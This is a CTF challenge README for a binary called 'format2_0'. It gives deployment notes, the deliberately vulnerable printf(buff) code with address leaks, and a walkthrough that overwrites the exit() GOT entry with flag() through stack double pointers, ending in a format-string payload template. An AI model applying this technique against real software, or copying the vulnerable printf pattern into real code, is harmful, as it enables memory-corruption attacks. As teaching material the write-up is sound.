# format2_0

## description
![pointers](./pointers_meme.jpg)
> nc endpoint 1337 

## deployment
 1. [format2_0](./deploy/format2_0) I/O must be redirected to TCP port (address and port in description must be updated).
 2. [flag](./deploy/flag) must be located in te same directory as [format2_0](./deploy/format2_0) 
 3. [format2_0](./deploy/format2_0) must be referenced as download link below description.

## gathering weapons

checksec:

```Canary  : Yes
NX      : Yes
PIE     : Yes
Fortify : No
RelRO   : Partial
```

Obfuscated `stack` and `text` segments leaks:

``` c
printf("%p\n%p\n", (uint)s.px + 0xf00d * 0xbad, (uint)flag - 0x1337 * 0x997);
```

 Classic string format vulnerability in `main()` :

```c
char buff[128]; // .bss
...
read(0, buff, sizeof(buff));
printf(buff);
```
Stack layout when `printf()` is executed:

```
+0x00: 0x00001337
+0x04: 0x00000bad
+0x08: 0xffffd638  →  +0x54  →  +0x58
+0x0c: 0x00000997
+0x10: 0xffffd640  →  +0x5c  →  +0x60
+0x14: 0x000000c2
...
+0x50: 0x56557000
+0x54: 0xffffd63c  →  +0x58
+0x58: 0xdeadface
+0x5c: 0xffffd644  →  +0x60
+0x60: 0xcafebabe
+0x64: 0x00000000
```

## solution

Due to `exit()` being called shortly after `printf()` We can't override the return address. 

Fortunately,  `got.plt` has `rw` permissions so We can override `got.plt@exit` with `flag()` address.  

Thanks to `text` segment leak We're able to determine the exact address of `got.plt@exit` and `flag()`.

Format buffer for `printf()` is controlled by us, but it is located in `.bss` so We're unable to directly specify each parameter on the stack.

When `printf()` is executed, two double pointers (`stack -> stack -> stack`) are left on the stack:

```
%3$p     %22$p     %23$p
+0x08 →  +0x54  →  +0x58

%5$p     %24$p     %25$p
+0x10 →  +0x5c  →  +0x60
```

Thanks to `stack`segment leak We're able to determine the exact address of each parameter on the stack.

We can change the two lower bytes of `%22$p` and `%24$p` so that they point to both high and low word of `%26$p`:

```
%3$p     %26$p     %26$p
+0x08 →  +0x54  →  +0x64

%5$p     %26$p     %26.5$p
+0x10 →  +0x5c  →  +0x66
```

Now We're able to set arbitrary address at `%26$p`, in our case it is address of `got.plt@exit`. 

Thanks to `exit()` address is not resolved yet, `got.plt@exit` points back to `got.plt` instead of `libc`, so We're sure that its high word is same as high word of `flag()` address.  It means that we only have to override its lower word so it points to `flag()`.

Final payload:

```
values of <n1> - <n5> depend on the actual aslr behavior
%c%<n1>c%hhn%<n2>c%hhn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<n3>c%hn%<n4>c%hn%<n5>c%hn
```

[exploit.py](./exploit.py) automates steps described above.

## why not positional arguments?

It is impossible to use positional arguments e.g. `%1$p`, because `printf()` makes copy of format parameters when positional arguments are used. 
It ruins this kind of exploitation technique.

## buffer size

Currently, `buffer` in `.bss` is `128` bytes long, but exploit mentioned above requires at most `80` bytes so it is possible to decrease the `buffer` size to make this task even more complicated.

